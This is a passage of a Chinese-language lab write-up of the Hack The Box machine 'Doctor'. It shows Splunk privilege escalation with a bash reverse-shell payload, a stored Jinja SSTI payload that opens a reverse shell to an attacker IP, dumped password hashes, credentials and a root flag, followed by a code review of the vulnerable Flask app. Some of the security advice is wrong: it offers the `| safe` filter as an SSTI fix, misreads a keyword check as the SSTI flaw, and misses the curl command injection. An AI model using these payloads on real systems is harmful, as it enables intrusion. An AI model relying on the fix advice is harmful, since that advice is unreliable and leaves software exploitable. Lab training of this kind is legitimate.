![Screenshot_20240418_215454](./图/Screenshot_20240418_215454.png)

### (4.searchsploit_不云了

```c
"searchsploit splunk"
    没东西,然后咱们去谷歌
```

![Screenshot_20240418_215701](./图/Screenshot_20240418_215701.png)







### (5.splunk提权

```c
git clone https://github.com/cnotin/SplunkWhisperer2.git
```

![Screenshot_20240418_212347](./图/Screenshot_20240418_212347.png)



```c
python3 PySplunkWhisperer2_remote.py --host 10.129.2.21 --lhost 10.10.14.30 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.30/9002 0>&1'"
```

![Screenshot_20240418_212958](./图/Screenshot_20240418_212958.png)

#### 1).flag.txt

```c
"cat root.txt"
aecb66b8f6660dfe920163d9ae109c45
```

![Screenshot_20240418_214449](./图/Screenshot_20240418_214449.png)





# 四.后渗透

## 1.关于20分钟清空账户

```c
"crontab -l"
/*********************************************************************************
这个`crontab`文件指示了一个定时任务，它将在每个小时的每个20分钟时执行 `/opt/clean/cleandb.py` 脚本。
下面是对每个字段的解释：

- `* /20`: 表示每20分钟执行一次任务。
- `*`: 通配符，表示任意的值。在这里，表示在每个小时、每个月、每一天、每一周都执行任务。
- `*`: 表示每个小时都执行任务。
- `*`: 表示每个月都执行任务。
- `*`: 表示每一天都执行任务。
- `*`: 表示每一周都执行任务。

因此，这个任务会在每个小时的每个20分钟时执行 `/opt/clean/cleandb.py` 脚本。
**********************************************************************/
```

![Screenshot_20240418_222822](./图/Screenshot_20240418_222822.png)

![Screenshot_20240418_223018](./图/Screenshot_20240418_223018.png)

```c
/*************************************************************************************
这段Python脚本的作用是：

    1. 删除 `/home/web/blog/flaskblog/site.db` 文件：
            `os.system('rm /home/web/blog/flaskblog/site.db')`

    2. 复制 `/opt/clean/site.db` 文件到 `/home/web/blog/flaskblog/site.db`：
            `os.system('cp /opt/clean/site.db /home/web/blog/flaskblog/site.db')`

    3. 更改 `/home/web/blog/flaskblog/site.db` 文件的所有者为 `web:web`：
            `os.system('chown web:web /home/web/blog/flaskblog/site.db')`

因此，这个脚本的目的是在文件系统中备份一个名为 `site.db` 的数据库文件。
*************************************************************************************/
```



## 2.关于数据库用户

```C
cd /home/web/blog/flaskblog
    
//想办法把site.db 传输到本机
    
    
"sqlite3 site.db"
"select * from user;"
```

![Screenshot_20240418_224821](./图/Screenshot_20240418_224821.png)



`site.db`重置后，我从工作站点目录中提取了一份副本。在这个数据库中，有两个用户：

```sqlite
root@kali# sqlite3 site.db 
SQLite version 3.33.0 2020-08-14 13:23:32
Enter ".help" for usage hints.
sqlite> select * from user;
1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
2|shaun|s@s.com|default.gif|$2b$12$wW0SocwtbEImnxgWoHJPMOzbTKs1qYCeE5Q0KnBtCXqD7NzuDne4y
```



还有与用户 ID 2 相关的漏洞利用帖子：

```sqlite
sqlite> select * from post;
1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1
2|{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").read()}}{%endif%}{%endfor%}|2020-09-28 13:01:21.252038|dsdsdsa|2

```



我从 中获取了一份“干净”数据库的副本`/opt/clean`，它只显示了一个用户：

```sqlite
sqlite> select * from user;
1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S

```



而且只有一篇文章：

```sqlite
sqlite> select * from post;
1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1
```

```c
一旦我等到清理作业运行，用户 ID 2 的用户现在就可用了。
    如果我注册这个用户，我将获得一个带有该用户 ID 2 的签名 Cookie。
    现在，如果我重置该框，重置时，已经有一个用户 ID 为 2 的用户 - shaun。
    当我使用该 cookie 到达该页面时，我已经以 shaun 身份登录。
```



## 3.模板注入修复

### (1.routes.py

```c
cat /home/web/blog/flaskblog/main/routes.py
    
//模板注入发生在/archive路由中，其定义在/home/web/blog/flaskblog/main/routes.py
```

```PY
from flask import render_template, render_template_string, request, Blueprint
from flask_login import current_user, login_required
from flaskblog.models import Post

main = Blueprint('main', __name__)


@main.route("/")
@main.route("/home")
@login_required
def home():
	page = request.args.get('page', 1, type=int)
	posts = Post.query.order_by(Post.date_posted.asc()).paginate(page=page, per_page=10)
	return render_template('home.html', posts=posts, author=current_user)


@main.route("/archive")
def feed():
	posts = Post.query.order_by(Post.date_posted.asc())
	tpl = '''
	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	'''
	for post in posts:
		if post.author==current_user:
			tpl += "<item><title>"+post.title+"</title></item>\n"
			tpl += '''
			</channel>
			'''
	return render_template_string(tpl)
```

![Screenshot_20240418_230122](./图/Screenshot_20240418_230122.png)

```c
该代码只是循环遍历所有帖子，并在每次有作者与当前用户匹配的帖子时添加 XML，将输出构建为字符串。
然后将该字符串传递给render_template_string，这是传递用户输入的危险函数。

另一方面，我可以看看相同的输入是如何传递到主页的。 
posts 数组被传递给render_templatewith home.html。
该模板循环遍历帖子并将内容放入模板中：
```

在上述代码中，SSTI（Server-Side Template Injection）漏洞可能存在于以下行：

```python
tpl += "<item><title>"+post.title+"</title></item>\n"
```

在这一行中，`post.title` 的值被直接拼接到了模板字符串中。如果 `post.title` 中包含了恶意的模板语言代码，那么这段代码就会成为SSTI漏洞的潜在来源。

为了防止SSTI漏洞，建议使用安全的渲染方式，比如使用Jinja2模板引擎的自动转义功能，如下所示：

```python
tpl += "<item><title>{{ post.title | safe }}</title></item>\n"
```

在这里，`{{ post.title | safe }}` 将确保 `post.title` 中的内容被安全地渲染到模板中，而不会执行其中的任何恶意代码。

### (2.forms.py

```c
//该PostForm对象用于验证提交，并在中定义/home/web/blog/flaskblog/posts/forms.py：
```

```c
__init__.py
__pycache__
routes.py
root@doctor:/home/web/blog/flaskblog/main# cat /home/web/blog/flaskblog/main/routes.py
<g/main# cat /home/web/blog/flaskblog/main/routes.py
from flask import render_template, render_template_string, request, Blueprint
from flask_login import current_user, login_required
from flaskblog.models import Post

main = Blueprint('main', __name__)


@main.route("/")
@main.route("/home")
@login_required
def home():
	page = request.args.get('page', 1, type=int)
	posts = Post.query.order_by(Post.date_posted.asc()).paginate(page=page, per_page=10)
	return render_template('home.html', posts=posts, author=current_user)


@main.route("/archive")
def feed():
	posts = Post.query.order_by(Post.date_posted.asc())
	tpl = '''
	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	'''
	for post in posts:
		if post.author==current_user:
			tpl += "<item><title>"+post.title+"</title></item>\n"
			tpl += '''
			</channel>
			'''
	return render_template_string(tpl)
root@doctor:/home/web/blog/flaskblog/main# cat /home/web/blog/flaskblog/posts/forms.py
<g/main# cat /home/web/blog/flaskblog/posts/forms.py
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField, TextAreaField
from wtforms.validators import DataRequired, ValidationError
from flask import current_app
import os,re,secrets

blacklist = [
    'hack',
    'xss',
    'payload',
    'sqli',
    'ssti',
    'lfi',
    'rfi',
]

class PostForm(FlaskForm):
    class Meta:
       csrf = False
    title = StringField('Title', validators=[DataRequired()])
    content = TextAreaField('Content', validators=[DataRequired()])
    submit = SubmitField('Post')
   

    def validate_content(self, form):
        text = form.data
        urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', text)
        for url in urls:
            url = urls[0]
            random_hex = secrets.token_hex(8)
            path = f'{current_app.root_path}/tmp/blacklist/{random_hex}'
            os.system(f'/bin/curl --max-time 2 {url} -o {path}')
            try:
                with open(path, 'r') as f:
                    content = f.read()
                    for keyword in blacklist:
                        if keyword in text:
                            raise ValidationError('A link you posted lead to a site with blacklisted content!')
            except FileNotFoundError:
                raise ValidationError('A link you posted was not valid!')

```

在 `forms.py` 文件中，`validate_content` 方法中的以下行代码存在SSTI漏洞：

```python
if keyword in text:
```

在这一行中，`keyword` 是从 `blacklist` 列表中获取的，而 `text` 是从用户提交的表单数据中获取的。如果用户提交了恶意的SSTI payload，它们可能会被存储在 `text` 中，然后用于在循环中进行检查。这就给了攻击者执行任意代码的机会。

为了修复这个漏洞，你应该避免在代码中使用用户输入来进行模板渲染或执行任何代码。而应该使用安全的方式来处理用户输入，比如使用 `escape` 函数来转义用户输入，或者使用白名单机制来限制用户输入的内容。另外，应该对从外部获取的数据进行验证和过滤，以确保它们不包含恶意代码。

```c
os.system(f'/bin/curl --max-time 2 {url} -o {path}')
/****************************************************************************************
这行代码是在 Python 中使用 `os.system()` 函数调用系统命令。
在这个例子中，它调用了 curl 命令来下载指定的 URL。
具体地说：

    - `/bin/curl` 是 curl 命令的路径。
    - `--max-time 2` 参数指定了 curl 命令的最长执行时间为 2 秒。如果超过这个时间，curl 将会退出。
    - `{url}` 是一个变量，它代表了要下载的 URL。
    - `-o {path}` 参数指定了下载完成后保存文件的路径，其中 `{path}` 是另一个变量，代表了文件的保存路径。

因此，这行代码的作用是使用 curl 命令下载指定的 URL，并将下载的内容保存到指定的文件路径中。
****************************************************************************************/
```





### (3.routes.py

```c
"find . | grep route"
"cat ./main/routes.py"
```

![Screenshot_20240419_235510](./图/Screenshot_20240419_235510.png)

```python
from flask import render_template, render_template_string, request, Blueprint
from flask_login import current_user, login_required
from flaskblog.models import Post

main = Blueprint('main', __name__)


@main.route("/")
@main.route("/home")
@login_required
def home():
	page = request.args.get('page', 1, type=int)
	posts = Post.query.order_by(Post.date_posted.asc()).paginate(page=page, per_page=10)
	return render_template('home.html', posts=posts, author=current_user)


@main.route("/archive")
def feed():
	posts = Post.query.order_by(Post.date_posted.asc())
	tpl = '''
	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	'''
	for post in posts:
		if post.author==current_user:
			tpl += "<item><title>"+post.title+"</title></item>\n"
			tpl += '''
			</channel>
			'''
	return render_template_string(tpl)
```

```C
/***************************************************************************************
这段 Flask 代码可能存在 Server-Side Template Injection (SSTI，服务器端模板注入) 漏洞。
在这段代码中`render_template_string()` 函数用于渲染 XML 模板字符串，其中包含了从数据库中查询到的文章标题
如果攻击者能够控制并注入恶意的 XML 模板代码，就可以在服务器端执行任意代码，从而导致严重的安全问题。

在这种情况下，攻击者可以通过修改 HTTP 请求的参数来注入恶意的 XML 模板代码，进而实现服务器端的代码执行
可能导致数据泄露、服务器控制等问题。

为了防止 SSTI 漏洞，建议使用 `render_template()` 函数而不是 `render_template_string()`
并且在构建 XML 模板时对输入数据进行适当的过滤和验证。
另外，还应该谨慎处理用户输入，尽量避免直接将用户提供的数据插入到模板中。
***************************************************************************************/
```





#### (4.修改

```c
cd /home/web/blog/flaskblog/main
  
vi routes.py
vi ../templates/home.html
```

![Screenshot_20240420_010328](./图/Screenshot_20240420_010328.png)

![Screenshot_20240420_010633](./图/Screenshot_20240420_010633.png)



```c
./blog.sh
```

![Screenshot_20240420_011837](./图/Screenshot_20240420_011837.png)

![Screenshot_20240420_011936](./图/Screenshot_20240420_011936.png)





















